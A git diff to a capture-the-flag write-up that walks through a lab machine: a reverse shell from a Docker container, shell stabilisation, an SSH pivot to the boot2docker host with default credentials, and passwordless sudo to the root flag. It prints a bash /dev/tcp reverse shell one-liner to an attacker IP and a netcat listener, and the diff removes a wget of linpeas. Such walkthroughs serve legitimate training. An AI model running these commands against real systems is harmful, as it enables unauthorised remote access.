@@ -112,10 +112,59 @@ When looking around a little we find the user flag `/var/lib/postgresql/user.txt
 - Something weird is that if we cat /etc/passwd we do not find the user tony we found in /home. However the folder tony belongs to root so our root user might be named tony
 - Also this seems to be a docker instance.
 - Let's get a reverse shell we set a listener `rlwrap nc -nlvp 1234` this way we will get a more verbose shell in case of errors
-- then we launch this from our previous prompt `bash -c 'bash -i >& /dev/tcp/10.10.14.11/1234 0>&1'`
-wget http://10.10.14.11/linpeas_linux_amd64
+- then we launch this from our previous prompt `bash -c 'bash -i >& /dev/tcp/10.10.14.5/1234 0>&1'`
 - uname -a gives `command standard output: 'Linux bc56e3cc55e9 4.14.154-boot2docker #1 SMP Thu Nov 14 19:19:08 UTC 2019 x86_64 GNU/Linux'` so we loopback to this boot2docker
+- We know it uses this docker: https://github.com/boot2docker/boot2docker
+- So If we want to escape docker we can ssh as docker to 172.17.0.1 `ssh docker@172.17.0.1` (we can check ifconfig for this)
+- We get a shell this way (the users and pass are in the git above)
+- The difficulty here is that we need to upgrade our shell and be quick because we loose the shell every few minutes.
+- Here is how to upgrade our shell (thanks to my friend Brianlane for the support on this part)
 
-## TODO
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+// Open a notepad to keep the info about term and rows and cols
+// Background our nc / rlwrap nc connection
+Ctrl - z 
+// Get our current terminal  version and write it into our notepad
+echo $TERM
+tmux-256color
+// Get our current terminal  dimensions
+stty -a
+// Write them down
+rows 52; columns 166;
+// Enable standard terminal commands
+stty raw -echo;fg
+//Reset the shell so we can configure it with our current settings
+reset
+//Enter the terminal info we noted earlier
+Terminal type?
+xterm-256color
+stty rows 38 columns 190
+```
 
-- See how to escape boot2docker
+- When we loose our shell and need to get it back we can repeat these steps just this way
+
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+// Background our nc / rlwrap nc connection
+Ctrl - z 
+// Enable standard terminal commands
+stty raw -echo;fg
+//Reset the shell so we can configure it with our current settings
+reset
+//Enter the terminal info we noted earlier
+Terminal type?
+xterm-256color
+stty rows 38 columns 190
+```
+
+- And ssh again `ssh docker@172.17.0.1`
+
+![docker](../.res/2023-03-25-19-09-23.png)
+
+- If we `sudo -l` we can see that it allows to `sudo su` without having to enter any password.
+- The flag is not in the root folder
+- If we go back we find a c directory with a Users folder in it that looks a lot like a win file system
+![docker](../.res/2023-03-25-19-45-31.png)
+- If we go to Administrator/Desktop we can get the root flag  
+![Administrator](../.res/2023-03-25-19-51-16.png)
